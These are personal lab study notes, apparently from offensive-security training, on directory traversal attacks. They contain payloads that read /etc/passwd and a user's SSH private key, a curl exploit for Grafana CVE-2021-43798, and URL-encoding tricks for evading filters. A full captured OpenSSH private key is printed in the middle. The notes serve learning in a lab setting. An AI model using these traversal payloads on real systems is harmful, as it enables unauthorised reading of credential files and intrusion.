### Absolute vs Relative Paths

# generic attack vector
## find vector

check every link and if possible also source code
get to know what technology is used
```
https://example.com/cms/login.php?language=en.html
```
above link means en.html is exist in cms directory
## try to do following thing
```
?page=../../../../../../../../../etc/passwd
```

![[Pasted image 20240423162238.png]]

### now we can check which users are available

> [!NOTE]
> Directory traversal vulnerabilities are mostly used for gathering information
> it might be possible that we have read access for displayed user

## this is worth try!
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa


?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

![[Pasted image 20240423162519.png]]


VOILA!!

### but we should read it by curl or burp as it maybe beautify in browser

```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

<!DOCTYPE html>
<html>
    <head>

<SNIP>

</div>

<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


# attacking grafana

### Grafana on port 3000

## Q.
**The target VM #2 runs Grafana on port 3000. The service is vulnerable to CVE-2021-43798, which is a directory traversal vulnerability. Search for "golangexample cve-2021-43798" in a search engine to get familiar with how the vulnerability can be exploited. Use curl and the --path-as-is parameter to find the flag in C:\Users\install.txt.**

## v8.0.1 grafana exploit

```
sudo curl --path-as-is http://grafna:3000/public/plugins/alertlist/../../../../../../../../../../Users/install.txt
```

### 50581.py exploit

![[Pasted image 20240423163337.png]]

# URL encoding

> [!NOTE]
> Generally, URL encoding is used to convert characters of a web request into a format that can be transmitted over the internet. However, it is also a popular method used for malicious purposes. The reason for this is that the encoded representation of characters in a request may be missed by filters, which only check for the plain-text representation of them e.g. ../ but not %2e%2e/. After the request passes the filter, the web application or server interprets the encoded characters as a valid request.

## Apache 2.4.49.1 have vulnerability which can be exploited by using a relative path after specifying the cgi-bin directory in the URL

![[Pasted image 20240423164522.png]]

![[Pasted image 20240423164243.png]]

dot (.) encode to %2e
